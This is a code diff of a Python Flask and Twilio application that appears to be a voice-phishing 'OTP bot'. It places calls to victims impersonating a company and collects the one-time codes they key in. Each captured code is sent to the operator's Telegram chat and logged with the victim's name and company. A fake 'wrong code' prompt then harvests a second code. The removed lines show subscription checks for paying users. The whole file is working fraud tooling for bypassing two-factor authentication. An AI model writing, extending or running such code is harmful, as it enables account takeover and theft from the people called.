@@ -1,45 +1,39 @@
 import os
 import json
-import requests
-from datetime import datetime, timedelta
-from twilio.rest import Client
-from twilio.twiml.voice_response import VoiceResponse, Gather
 from flask import Flask, request, jsonify
+from twilio.twiml.voice_response import VoiceResponse, Gather, Play
+import requests
+import datetime
+import pytz
 
-# Load configuration from settings.json
-with open('./conf/settings.txt', 'r') as f:
-    raw_config = json.load(f)
-
-# Correct way to get the bot token from settings.txt
-bot_token = raw_config.get('bot_token', '')
-account_sid = raw_config.get('account_sid', '')
-auth_token = raw_config.get('auth_token', '')
-render_url = raw_config.get('render_url', 'https://glitcha.onrender.com')  # Use the actual Render URL here
-phone_numz = raw_config.get('phone_numz', '')
-
-# Define admin user ID
-admin_id = 6397626287  # Set admin ID
-
-# Initialize client and bot
-client = Client(account_sid, auth_token)
 app = Flask(__name__)
 
-# Helper function to check subscription status
-def check_subscription(idkey):
-    subscription_path = f'./conf/{idkey}/subs.txt'
-    
-    if os.path.exists(subscription_path):
-        with open(subscription_path, 'r') as f:
-            subscription = f.read().strip()
-        
-        try:
-            # Parse subscription expiry date
-            expiry_date = datetime.strptime(subscription, '%d/%m/%Y')
-            return "ACTIVE" if expiry_date >= datetime.now() else "EXPIRED"
-        except ValueError:
-            return "EXPIRED"
-    
-    return "EXPIRED"
+# Get sensitive information from environment variables
+TELEGRAM_BOT_TOKEN = os.getenv("bot_token")
+TWILIO_ACCOUNT_SID = os.getenv("account_sid")
+TWILIO_AUTH_TOKEN = os.getenv("auth_token")
+PHONE_NUM = os.getenv("phone_numz")
+
+# Check if any environment variables are missing
+if not all([TELEGRAM_BOT_TOKEN, TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN, PHONE_NUM]):
+    raise Exception("One or more required environment variables are missing!")
+
+TELEGRAM_API_BASE = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"
+
+def send_telegram_message(chat_id, text):
+    try:
+        url = f"{TELEGRAM_API_BASE}/sendMessage"
+        payload = {"chat_id": chat_id, "text": text}
+        response = requests.get(url, params=payload)
+        return response.status_code == 200
+    except Exception as e:
+        app.logger.error(f"Error sending message to Telegram: {e}")
+        return False
+
+def get_file_path(user_id, filename):
+    base_path = os.path.join(os.path.dirname(__file__), "conf", user_id)
+    os.makedirs(base_path, exist_ok=True)
+    return os.path.join(base_path, filename)
 
 @app.route("/voice", methods=["POST"])
 def voice():
@@ -85,54 +79,71 @@ def gather():
 
     return str(resp)
 
-@app.route("/call", methods=["POST"])
-def custom_call_handler():
-    try:
-        phonenum = request.form.get("phonenum")
-        name = request.form.get("name")
-        digits = request.form.get("digits")
-        companyz = request.form.get("company")
+@app.route("/gatherotp", methods=["POST"])
+def gatherotp():
+    chat_id = request.args.get("chat_id", default="*", type=str)
+    user_id = request.args.get("user_id", default="*", type=str)
+    resp = VoiceResponse()
 
-        # Validate phone number format: starts with '+1' and contains 10 digits
-        if not phonenum.startswith('+1') or len(phonenum) != 12 or not phonenum[2:].isdigit():
-            return jsonify({"error": "Invalid phone number format! Please enter a number in the format +1xxxxxxxxxx."})
+    if "Digits" in request.values:
+        otp = request.values["Digits"]
+        send_telegram_message(chat_id, f"OTP : {otp}")
 
-        open(f'./conf/{request.form["user_id"]}/Digits.txt', 'w').write(digits)
-        open(f'./conf/{request.form["user_id"]}/Name.txt', 'w').write(name)
-        open(f'./conf/{request.form["user_id"]}/Company Name.txt', 'w').write(companyz)
+        with open("otp.txt", "w", encoding="utf-8") as otp_file:
+            otp_file.write(otp)
 
-        bot.send_message(
-            request.form["chat_id"],
-            f"🟣 Initiating a Call...\n\n👤 Name: {name}\n📞 Phone: {phonenum}\n🔑 Code: {digits}\n🏢 Company: {companyz}"
-        )
+        with open("logotp.txt", "a", encoding="utf-8") as log_file:
+            timestamp = datetime.datetime.now(pytz.timezone("Asia/Jakarta"))
+            name = open(get_file_path(user_id, "Name.txt"), "r").read().strip()
+            company = open(get_file_path(user_id, "Company Name.txt"), "r").read().strip()
+            log_file.write(f"Tanggal : {timestamp}\nNama : {name}\nCompany : {company}\nOTP : {otp}\n\n")
 
-        # Initiate a call using Twilio
-        call = client.calls.create(
-            to=phonenum,
-            from_=phone_numz,
-            url=f'{render_url}/voice?chat_id={request.form["chat_id"]}&user_id={request.form["user_id"]}'  # Use the Render URL for webhook
-        )
-        return jsonify({"message": f"📞 Call initiated successfully! Call SID: {call.sid}"}), 200
+        resp.play(get_file_path("sounds", "thankyou.mp3"))
+    else:
+        resp.say("Sorry, I don't understand that choice.")
+        resp.redirect("/gather")
 
-    except Exception as e:
-        return jsonify({"error": str(e)}), 400
+    return str(resp)
 
-@app.route("/twilio_webhook", methods=["POST"])
-def twilio_webhook():
-    """Handle incoming call status changes."""
-    call_sid = request.form.get('CallSid')
-    status = request.form.get('CallStatus')
-    # You can log this or handle it as needed
-    print(f"Call SID: {call_sid}, Status: {status}")
-    return "", 200
+@app.route("/denyotp", methods=["POST"])
+def denyotp():
+    chat_id = request.args.get("chat_id", default="*", type=str)
+    user_id = request.args.get("user_id", default="*", type=str)
 
-def send_telegram_message(chat_id, text):
-    """Helper to send message to Telegram."""
-    TELEGRAM_API_BASE = f"https://api.telegram.org/bot{bot_token}"
-    url = f"{TELEGRAM_API_BASE}/sendMessage"
-    payload = {"chat_id": chat_id, "text": text}
-    response = requests.get(url, params=payload)
-    return response.status_code == 200
+    send_telegram_message(chat_id, "Resend Code")
+
+    resp = VoiceResponse()
+    resp.play(get_file_path("sounds", "wrongcode.mp3"))
+    resp.pause(length=1)
+
+    num_digits = int(open(get_file_path(user_id, "Digits.txt"), "r").read().strip())
+    gatherotp = Gather(num_digits=num_digits, action=f"/gathernewotp?chat_id={chat_id}&user_id={user_id}", timeout=120)
+    gatherotp.say(f"Please enter the {num_digits} digits code.", voice="man")
+    resp.append(gatherotp)
+
+    return str(resp)
+
+@app.route("/gathernewotp", methods=["POST"])
+def gathernewotp():
+    chat_id = request.args.get("chat_id", default="*", type=str)
+    user_id = request.args.get("user_id", default="*", type=str)
+    resp = VoiceResponse()
+
+    if "Digits" in request.values:
+        otp = request.values["Digits"]
+        send_telegram_message(chat_id, f"OTP : {otp}")
+        resp.play(get_file_path("sounds", "thankyou.mp3"))
+    else:
+        resp.say("Sorry, I don't understand that choice.")
+        resp.redirect("/gather")
+
+    return str(resp)
+
+@app.route("/acceptotp", methods=["POST"])
+def acceptotp():
+    resp = VoiceResponse()
+    resp.play(get_file_path("sounds", "thankyou.mp3"))
+    return str(resp)
 
 if __name__ == "__main__":
     app.run(debug=True, host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
